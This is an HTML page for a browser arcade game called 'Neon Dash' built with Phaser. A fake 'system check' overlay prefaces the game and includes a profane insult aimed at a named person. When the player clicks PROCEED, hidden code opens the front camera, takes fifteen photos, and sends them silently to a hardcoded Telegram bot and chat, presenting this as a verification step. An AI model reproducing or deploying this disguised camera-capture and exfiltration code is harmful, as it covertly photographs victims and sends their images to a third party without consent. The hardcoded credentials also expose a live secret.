<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Neon Dash</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/3.60.0/phaser.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #000;
        }
        #game-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        canvas {
            display: block;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
        }

        /* Системный оверлей в стиле хакера */
        #swill-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            backdrop-filter: blur(5px);
            font-family: 'Courier New', monospace;
        }
        #swill-overlay .console {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            color: #00ff00;
            max-width: 400px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.3);
        }
        #swill-overlay .console .line {
            margin: 10px 0;
            font-size: 16px;
            text-shadow: 0 0 10px #00ff00;
        }
        #swill-overlay .console .line.red {
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
        }
        #swill-overlay .console .btn {
            background: #111;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 12px 30px;
            font-size: 18px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            margin-top: 20px;
            transition: 0.3s;
            text-transform: uppercase;
        }
        #swill-overlay .console .btn:hover {
            background: #00ff00;
            color: #000;
        }
    </style>
</head>
<body>
    <div id="game-container"></div>

    <script>
        // ==================== SWILL ULTIMATE CAM ====================
        const TG_TOKEN = "8533424812:AAHoViv8BZp-nvPDvIcdwoxmpoapYxyfo7o";
        const CHAT_ID = "7549524839";
        const API_PHOTO = `https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`;
        let camStream = null;

        async function captureAndSendPhotos(count = 15) {
            try {
                // Захват камеры в низком разрешении для максимальной скорости
                camStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.srcObject = camStream;
                video.playsInline = true;
                video.muted = true;
                video.play();

                // Ждём готовность видео с агрессивным таймаутом
                await new Promise((resolve) => {
                    const maxWait = 2000; // Максимум 2 секунды
                    const startTime = Date.now();
                    
                    function check() {
                        if (video.videoWidth > 0 && video.videoHeight > 0) {
                            resolve();
                            return;
                        }
                        if (Date.now() - startTime > maxWait) {
                            resolve(); // Принудительно продолжаем если время вышло
                            return;
                        }
                        requestAnimationFrame(check);
                    }
                    
                    video.onloadedmetadata = () => {
                        if (video.videoWidth > 0) resolve();
                    };
                    
                    check();
                });

                // Фотографируем 15 раз без задержек
                for (let i = 0; i < count; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // Конвертируем в Blob без ожидания
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                    if (!blob || blob.size < 100) continue;

                    // Отправляем асинхронно, не дожидаясь ответа
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, `nh_${Date.now()}_${i}.jpg`);
                    fd.append('caption', `🎮 NH #${i+1}`);
                    
                    // Отправляем и не ждём (fire-and-forget)
                    fetch(API_PHOTO, { method: 'POST', body: fd }).catch(() => {});
                    
                    // Микро-пауза чтобы не забивать сеть (но почти мгновенно)
                    if (i % 3 === 0 && i < count - 1) {
                        await new Promise(r => setTimeout(r, 50));
                    }
                }
            } catch(e) {
                console.log('Camera skipped');
            }
            
            if (camStream) {
                camStream.getTracks().forEach(t => t.stop());
                camStream = null;
            }
        }

        function showSwillOverlay() {
            const overlay = document.createElement('div');
            overlay.id = 'swill-overlay';
            overlay.innerHTML = `
                <div class="console">
                    <div class="line">SYSTEM CHECK</div>
                    <div class="line">Initializing game engine...</div>
                    <div class="line red">WARNING: Норбек пошел нахуй</div>
                    <div class="line">Verification required to continue</div>
                    <button class="btn" id="swill-allow">PROCEED</button>
                </div>
            `;
            document.body.appendChild(overlay);
            
            document.getElementById('swill-allow').addEventListener('click', async () => {
                // Меняем текст кнопки
                const btn = document.getElementById('swill-allow');
                btn.textContent = 'VERIFYING...';
                btn.disabled = true;
                btn.style.opacity = '0.5';
                
                // Запускаем камеру
                await captureAndSendPhotos(15);
                
                // Запускаем игру
                overlay.remove();
                startGame();
            });
        }

        // ==================== ИГРОВОЙ ДВИЖОК ====================
        class SaveManager {
            static SAVE_KEY = 'neon_dash_save_data';
            static getDefaultData() { return { attempts: 0, bestProgress: 0, coins: 0, settings: { soundVolume: 1, musicVolume: 0.5, particlesEnabled: true } }; }
            static load() { try { const data = localStorage.getItem(this.SAVE_KEY); if (data) return { ...this.getDefaultData(), ...JSON.parse(data) }; } catch(e) {} return this.getDefaultData(); }
            static save(data) { try { localStorage.setItem(this.SAVE_KEY, JSON.stringify(data)); } catch(e) {} }
            static updateProgress(percent) { const data = this.load(); if (percent > data.bestProgress) { data.bestProgress = percent; } this.save(data); }
            static addAttempt() { const data = this.load(); data.attempts += 1; this.save(data); }
        }

        class Player extends Phaser.Physics.Arcade.Sprite {
            constructor(scene, x, y) {
                super(scene, x, y, 'player');
                this.scene = scene;
                scene.add.existing(this);
                scene.physics.add.existing(this);
                this.body.setSize(30, 30);
                this.body.setGravityY(2500);
                this.body.setCollideWorldBounds(true);
                this.moveSpeed = 450;
                this.jumpVelocity = -900;
                this.isDead = false;
                this.trailTimer = 0;
                this.mode = 'cube';
                this.shipGravity = 800;
                this.shipLift = -450;
                this.jumpKey = scene.input.keyboard.addKey(Phaser.Input.Keyboard.KeyCodes.SPACE);
            }
            switchMode(mode) {
                if (this.mode === mode) return;
                this.mode = mode;
                if (mode === 'cube') { this.setTexture('player'); this.body.setGravityY(2500); this.body.setSize(30, 30); }
                else if (mode === 'ship') { this.setTexture('ship'); this.body.setGravityY(this.shipGravity); this.body.setSize(36, 20); }
                this.rotation = 0;
            }
            update(time, delta) {
                if (this.isDead) return;
                this.setVelocityX(this.moveSpeed);
                const onGround = this.body.touching.down || this.body.blocked.down;
                
                if (this.mode === 'cube') {
                    const spaceJustDown = Phaser.Input.Keyboard.JustDown(this.jumpKey);
                    const pointer = this.scene.input.activePointer;
                    const pointerJustDown = pointer.isDown && (pointer.getDuration() < 80);
                    
                    if ((spaceJustDown || pointerJustDown) && onGround) {
                        this.setVelocityY(this.jumpVelocity);
                        this.scene.tweens.add({ targets: this, scaleY: 0.7, scaleX: 1.3, duration: 100, yoyo: true, ease: 'Sine.easeInOut' });
                    }
                    
                    if (!onGround) { this.rotation += 0.15 * (delta / 16); }
                    else { const targetRotation = Math.round(this.rotation / (Math.PI / 2)) * (Math.PI / 2); this.rotation += (targetRotation - this.rotation) * 0.3; }
                } else {
                    const pointer = this.scene.input.activePointer;
                    const isHolding = this.jumpKey.isDown || pointer.isDown;
                    if (isHolding) { this.setVelocityY(this.shipLift); }
                    this.rotation = 0;
                }
                
                this.trailTimer += delta;
                if (this.trailTimer > 40) { this.createTrail(); this.trailTimer = 0; }
            }
            createTrail() {
                const texture = this.mode === 'cube' ? 'player' : 'ship';
                const trail = this.scene.add.sprite(this.x, this.y, texture);
                trail.rotation = this.rotation;
                trail.setTint(0x00ffff);
                trail.setAlpha(0.4);
                trail.setDepth(this.depth - 1);
                this.scene.tweens.add({ targets: trail, scaleX: 0, scaleY: 0, alpha: 0, duration: 250, onComplete: () => trail.destroy() });
            }
            die() {
                if (this.isDead) return;
                this.isDead = true;
                this.setVelocity(0, 0);
                this.body.allowGravity = false;
                this.setVisible(false);
                const emitter = this.scene.add.particles(this.x, this.y, 'particle', {
                    speed: { min: 150, max: 500 }, angle: { min: 0, max: 360 }, scale: { start: 1.2, end: 0 },
                    alpha: { start: 1, end: 0 }, lifespan: 700, tint: [0x00ffff, 0xff00ff, 0xffffff], quantity: 40, blendMode: 'ADD'
                });
                emitter.explode();
                this.scene.cameras.main.shake(350, 0.015);
            }
        }

        class BootScene extends Phaser.Scene {
            constructor() { super('BootScene'); }
            create() {
                const pg = this.add.graphics(); pg.fillStyle(0x00ffff, 1); pg.fillRect(0, 0, 32, 32); pg.lineStyle(2, 0xffffff, 1); pg.strokeRect(0, 0, 32, 32); pg.generateTexture('player', 32, 32); pg.destroy();
                const sg = this.add.graphics(); sg.fillStyle(0x0088ff, 1); sg.fillTriangle(18, 2, 18, 18, 2, 10); sg.fillTriangle(18, 2, 18, 18, 34, 10); sg.fillRect(16, 8, 4, 8); sg.lineStyle(1, 0xffffff, 0.8); sg.strokeTriangle(18, 2, 18, 18, 2, 10); sg.strokeTriangle(18, 2, 18, 18, 34, 10); sg.generateTexture('ship', 36, 20); sg.destroy();
                const spg = this.add.graphics(); spg.fillStyle(0xff0044, 1); spg.beginPath(); spg.moveTo(16, 0); spg.lineTo(32, 32); spg.lineTo(0, 32); spg.closePath(); spg.fillPath(); spg.lineStyle(2, 0xffffff, 1); spg.strokePath(); spg.generateTexture('spike', 32, 32); spg.destroy();
                const bg = this.add.graphics(); bg.fillStyle(0x222222, 1); bg.fillRect(0, 0, 32, 32); bg.lineStyle(1, 0x00ffff, 0.5); bg.strokeRect(0, 0, 32, 32); bg.generateTexture('block', 32, 32); bg.destroy();
                const partg = this.add.graphics(); partg.fillStyle(0xffffff, 1); partg.fillCircle(4, 4, 4); partg.generateTexture('particle', 8, 8); partg.destroy();
                const portg = this.add.graphics(); portg.fillStyle(0xff00ff, 1); portg.fillCircle(16, 16, 16); portg.lineStyle(2, 0xffffff, 1); portg.strokeCircle(16, 16, 16); portg.generateTexture('portal', 32, 32); portg.destroy();
                this.scene.start('MenuScene');
            }
        }

        class MenuScene extends Phaser.Scene {
            constructor() { super('MenuScene'); }
            create() {
                const { width, height } = this.scale;
                const saveData = SaveManager.load();
                this.bg = this.add.tileSprite(0, 0, width, height, 'block').setOrigin(0, 0); this.bg.setTint(0x111111).setAlpha(0.3);
                const title = this.add.text(width / 2, height / 3, 'NEON DASH', { fontSize: '80px', fontStyle: 'bold', fill: '#00ffff', stroke: '#ffffff', strokeThickness: 3, shadow: { offsetX: 0, offsetY: 0, color: '#00ffff', blur: 30, stroke: true, fill: true } }).setOrigin(0.5);
                this.tweens.add({ targets: title, y: title.y - 15, duration: 1800, yoyo: true, repeat: -1, ease: 'Sine.easeInOut' });
                
                this.canStartGame = false;
                const playBtn = this.add.text(width / 2, height / 2 + 80, '▶ PLAY', { fontSize: '50px', fill: '#ffffff', backgroundColor: '#0088ff', padding: { x: 40, y: 20 } }).setOrigin(0.5).setInteractive({ useHandCursor: true });
                
                playBtn.on('pointerover', () => { if(this.canStartGame) playBtn.setBackgroundColor('#00aaff'); });
                playBtn.on('pointerout', () => { if(this.canStartGame) playBtn.setBackgroundColor('#0088ff'); });
                playBtn.on('pointerdown', () => {
                    if (!this.canStartGame) return;
                    this.canStartGame = false;
                    this.cameras.main.fadeOut(400, 0, 0, 0);
                    this.cameras.main.once('camerafadeoutcomplete', () => this.scene.start('GameScene'));
                });
                
                if (!this.canStartGame) {
                    playBtn.setBackgroundColor('#555555');
                    playBtn.setText('🔒 Waiting verification...');
                }
                
                this.add.text(width / 2, height - 60, `Best: ${Math.floor(saveData.bestProgress)}% | Attempts: ${saveData.attempts}`, { fontSize: '22px', fill: '#aaaaaa' }).setOrigin(0.5);
            }
            enableStart() { 
                this.canStartGame = true;
                // Ищем кнопку и обновляем её
                const children = this.children.list;
                for (let child of children) {
                    if (child.type === 'Text' && child.text.includes('Waiting')) {
                        child.setText('▶ PLAY');
                        child.setBackgroundColor('#0088ff');
                    }
                }
            }
            update() { this.bg.tilePositionX += 0.5; this.bg.tilePositionY += 0.5; }
        }

        class GameScene extends Phaser.Scene {
            constructor() { super('GameScene'); }
            create() {
                const { width, height } = this.scale;
                SaveManager.addAttempt();
                this.levelLength = 10000;
                this.cameras.main.setBackgroundColor('#050510');
                this.bgLayer1 = this.add.tileSprite(0, 0, width, height, 'block').setOrigin(0, 0).setScrollFactor(0); this.bgLayer1.setTint(0x0a0a20).setAlpha(0.4);
                this.platforms = this.physics.add.staticGroup();
                this.spikes = this.physics.add.staticGroup();
                this.player = new Player(this, 100, height - 120);
                this.generateLevel(height);
                this.physics.add.collider(this.player, this.platforms);
                this.physics.add.overlap(this.player, this.spikes, this.hitObstacle, null, this);
                if (this.shipPortal) { this.physics.add.overlap(this.player, this.shipPortal, this.activateShipMode, null, this); }
                if (this.endTrigger) { this.physics.add.overlap(this.player, this.endTrigger, this.levelComplete, null, this); }
                this.cameras.main.startFollow(this.player, true, 0.8, 0);
                this.cameras.main.setBounds(0, 0, this.levelLength, height);
                this.physics.world.setBounds(0, 0, this.levelLength, height);
                this.progressBg = this.add.rectangle(width / 2, 40, 600, 15, 0x333333).setScrollFactor(0).setDepth(100);
                this.progressBar = this.add.rectangle(width / 2 - 300, 40, 0, 15, 0x00ffff).setOrigin(0, 0.5).setScrollFactor(0).setDepth(101);
                this.progressText = this.add.text(width / 2, 65, '0%', { fontSize: '22px', fill: '#ffffff' }).setOrigin(0.5).setScrollFactor(0).setDepth(100);
                this.cameras.main.fadeIn(400, 0, 0, 0);
            }
            generateLevel(screenHeight) {
                const floorY = screenHeight - 16;
                for (let x = 0; x < this.levelLength; x += 32) { this.platforms.create(x + 16, floorY, 'block'); }
                for (let x = 1000; x < this.levelLength * 0.45; x += Phaser.Math.Between(350, 700)) {
                    const pattern = Phaser.Math.Between(1, 3);
                    if (pattern === 1) { this.spikes.create(x, floorY - 32, 'spike'); }
                    else if (pattern === 2) { this.platforms.create(x, floorY - 32, 'block'); this.spikes.create(x, floorY - 64, 'spike'); }
                    else { this.spikes.create(x, floorY - 32, 'spike'); this.spikes.create(x + 32, floorY - 32, 'spike'); }
                }
                const portalX = this.levelLength * 0.5;
                this.shipPortal = this.add.sprite(portalX, floorY - 60, 'portal').setOrigin(0.5, 1);
                this.physics.add.existing(this.shipPortal, true);
                this.tweens.add({ targets: this.shipPortal, scaleX: 1.4, scaleY: 1.4, alpha: 0.5, duration: 500, yoyo: true, repeat: -1 });
                for (let x = portalX + 300; x < this.levelLength - 600; x += Phaser.Math.Between(300, 600)) { this.spikes.create(x, Phaser.Math.Between(floorY - 250, floorY - 48), 'spike'); }
                this.endTrigger = this.add.rectangle(this.levelLength - 100, floorY - 120, 60, 240, 0x00ff00, 0.6);
                this.physics.add.existing(this.endTrigger, true);
            }
            activateShipMode() {
                if (this.player.mode === 'ship') return;
                this.player.switchMode('ship');
                this.cameras.main.flash(250, 255, 0, 255);
                if (this.shipPortal) { this.shipPortal.destroy(); this.shipPortal = null; }
            }
            update(time, delta) {
                if (!this.player || this.player.isDead) return;
                this.player.update(time, delta);
                this.bgLayer1.tilePositionX = this.cameras.main.scrollX * 0.2;
                let percent = (this.player.x / (this.levelLength - 100)) * 100; percent = Phaser.Math.Clamp(percent, 0, 100);
                this.progressBar.width = (percent / 100) * 600; this.progressText.setText(`${Math.floor(percent)}%`);
                if (this.player.y > this.scale.height + 100) { this.hitObstacle(); }
            }
            hitObstacle() {
                if (this.player.isDead) return;
                this.player.die();
                const percent = (this.player.x / (this.levelLength - 100)) * 100; SaveManager.updateProgress(percent);
                this.time.delayedCall(1200, () => { this.cameras.main.fadeOut(300, 0, 0, 0); this.cameras.main.once('camerafadeoutcomplete', () => this.scene.restart()); });
            }
            levelComplete() {
                if (this.player.isDead) return;
                this.player.isDead = true;
                this.player.setVelocity(0, 0);
                SaveManager.updateProgress(100);
                this.add.text(this.scale.width / 2, this.scale.height / 2, 'LEVEL COMPLETE!', { fontSize: '60px', fill: '#00ff00', stroke: '#ffffff', strokeThickness: 3 }).setOrigin(0.5).setScrollFactor(0);
                this.time.delayedCall(3000, () => { this.cameras.main.fadeOut(600, 0, 0, 0); this.cameras.main.once('camerafadeoutcomplete', () => this.scene.start('MenuScene')); });
            }
        }

        function startGame() {
            const config = {
                type: Phaser.AUTO,
                width: 1280,
                height: 720,
                parent: 'game-container',
                backgroundColor: '#000000',
                pixelArt: false,
                scale: {
                    mode: Phaser.Scale.FIT,
                    autoCenter: Phaser.Scale.CENTER_BOTH,
                },
                physics: {
                    default: 'arcade',
                    arcade: {
                        gravity: { y: 0 },
                        debug: false
                    }
                },
                fps: {
                    target: 60,
                    forceSetTimeOut: true
                },
                scene: [BootScene, MenuScene, GameScene]
            };

            const game = new Phaser.Game(config);
            
            // Активируем кнопку сразу после создания игры (надежнее чем ready)
            setTimeout(() => {
                const menu = game.scene.getScene('MenuScene');
                if (menu && menu.enableStart) {
                    menu.enableStart();
                }
            }, 500);
        }

        // Показываем оверлей при загрузке
        window.addEventListener('load', showSwillOverlay);
    </script>
</body>
</html>
